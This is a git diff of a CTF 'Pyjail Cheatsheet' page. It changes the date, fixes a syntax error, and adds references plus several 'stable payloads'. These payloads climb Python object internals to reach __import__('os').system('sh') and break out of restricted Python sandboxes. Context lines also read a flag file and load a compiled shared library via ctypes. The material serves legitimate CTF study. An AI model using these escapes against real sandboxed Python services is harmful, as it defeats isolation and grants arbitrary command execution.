@@ -1,7 +1,7 @@
 ---
 title: "Pyjail Cheatsheet"
 description: ""
-pubDate: "Jan 19 2025"
+pubDate: "Sep 04 2025"
 draft: false
 tags:
   - "cheatsheet"
@@ -110,7 +110,7 @@ license._Printer__filenames = ['/flag.txt']; license()
 ```py
 # sys
 sys = __import__("sys")
-io = open.__self__; sys = io.__loader__.load_module("sys"))[-1]
+io = open.__self__; sys = io.__loader__.load_module("sys")[-1]
 builtins = print.__self__; sys = builtins.__loader__.create_module([builtins.__spec__ for builtins.__spec__.name in ["sys"]][0])
 
 sys.modules["module_name"] # contains most of the builtin modules alongside frozen imports (https://docs.python.org/3/library/index.html)
@@ -343,6 +343,7 @@ print(delete_me) # error
   - `pdb` - similar to importing pdb
   - `antigravity` - similar to importing antigravity
   - `PROGRAM_NAME` / `jail` / `app` - similar to importing and rerunning program if not wrapped in `if __name__ == "__main__":`
+  - `IPython.__main__`, - for modules with nested package contents, importing them, i.e. `MODULE_NAME.CONTENT1.CONTENT2`, will also execute the code there given that `__name__` is not checked.
   - note: loading modules would also add related imported classes to `object.__subclasses__()`
 - see [SECCON Beginners CTF 2022: hitchhike4b](https://github.com/SECCON/Beginners_CTF_2022/blob/main/misc/hitchhike4b/writeup.md)
 
@@ -389,14 +390,22 @@ os.system("gcc -shared -fPIC /tmp/lib.c -o lib.so")
 print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))
 ```
 
+### zip confusion
+
+- see https://github.com/python/cpython/issues/103051 & https://www.analogue.computer/blog/python-zip-confusion
+
 ### stable payloads
 
 ```py
-# @salvatore-abello - type.__subclasses__(type)[0] -> <class 'abc.ABCMeta'>
-().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # need __import__
+# @salvatore-abello
 ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")
+[].__class__.__subclasses__()[0].__init__.__builtins__["__import__"]("os").system("sh")
+[].__class__.__subclasses__()[1].__hash__.__globals__["__import__"]("os").system("sh")
 
-# <function __newobj__ at 0x7f0000000000> - need __import__ tho
+# if __import__ is in builtins
+## type.__subclasses__(type)[0] -> <class 'abc.ABCMeta'>
+().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
+## [].__reduce_ex__(3)[0] -> <function __newobj__ at 0x7f0000000000>
 [].__reduce_ex__(3)[0].__globals__["__builtins__"]["__import__"]("os").system("sh")
 [].__reduce_ex__(3)[0].__builtins__["__import__"]("os").system("sh")
 ```
@@ -423,7 +432,10 @@ print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[
   - `"".__class__`
   - `[].__doc__.__class__`
   - `[].__class__.__module__.__class__`
+  - `0..hex().__class__`
+  - `(0).__repr__.__class__`
 - `tuple`
+  - `[].__class__.__mro__.__class__`
   - `[].__class__.__bases__.__class__`
 - `dict`
   - `{}.__class__`
